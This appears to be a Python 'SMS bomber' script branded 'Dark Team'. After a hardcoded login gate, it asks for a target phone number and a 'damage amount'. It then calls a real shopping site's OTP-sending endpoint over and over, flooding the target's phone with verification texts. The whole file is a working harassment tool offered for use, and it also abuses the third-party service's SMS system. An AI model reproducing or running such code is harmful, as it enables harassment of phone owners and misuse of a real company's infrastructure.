import os

import requests

import time

from requests.structures import CaseInsensitiveDict


#CVALUE

blue= '\33[94m'

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

os.system('clear')

line=red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="


print ("\033[0;34m")   

print("""




██████   █████  ██████  ██   ██       ████████ ███████  █████  ███    ███ 
██   ██ ██   ██ ██   ██ ██  ██           ██    ██      ██   ██ ████  ████ 
██   ██ ███████ ██████  █████   █████    ██    █████   ███████ ██ ████ ██ 
██   ██ ██   ██ ██   ██ ██  ██           ██    ██      ██   ██ ██  ██  ██ 
██████  ██   ██ ██   ██ ██   ██          ██    ███████ ██   ██ ██      ██ 
                                                                          
 """)






space=" "

logo=green+str("""
          
                       
   ╔═════════════════════════════════╗               
   ║ Author.  : Aϝrαɳ Ahɱҽԃ°              ║        
   ║ Facebook : iiitzAfran                ║
   ║ Circle   :Dαrκωεb2811                ║
   ╚═════════════════════════════════╝          
       
 
  
  
""")




      
 #HEADER                

text=red+"\t\t tnx to : "+green+"NiiL281"+cyan+"\n\n\t\t★★ "+red+" 𝔻"+cyan+"𝔻𝕒𝕣𝕜 𝕋𝕖𝕒𝕞★★   \n" 

notice=""     

def header():
	print(logo)
	print(text)
	print(line)
	print(notice)


#SECURITY				

header()

print(yellow+"-----------------------------------------------------------")

print("	Enter The Real Username & Password To Continue")

print("-----------------------------------------------------------")

n=2

while n==2:
		a=str(input(red+"\n\n\t\t[>] Username:"+green))
		b=str(input(red+"\n\n\t\t[>] Password:"+green))
		if a=="DarkTeam" and b=="Admin":
			print(green+"\n\n\t\t[ √ ] Accepted")
			n=3
		else:
			
			print(red+"\n\n\t\t[ × ] Rejected.	Please Try Again")
			n=2
			
			os.system('clear')
			header()

#MAIN_TOOL

os.system('clear')

number=str(input(green+"\n\n\n\n\n\n\n\t[>]Enter Your Target Number:"+red))

amount = int(input(green+"        \n        [>]Enter Your Damage Amount:"+red))


print ("\n\n============================================================")


url = "https://qcoom.com/mobileemailoptional/index/sentotpbyreg/?mobile=88"+number+"&_=1630138214987"

headers = CaseInsensitiveDict()


os.system('clear')

resp = requests.post(url)

for i in range (amount):
	requests.get(url) 
	print(str (i+1)+" Damage \n")
	continue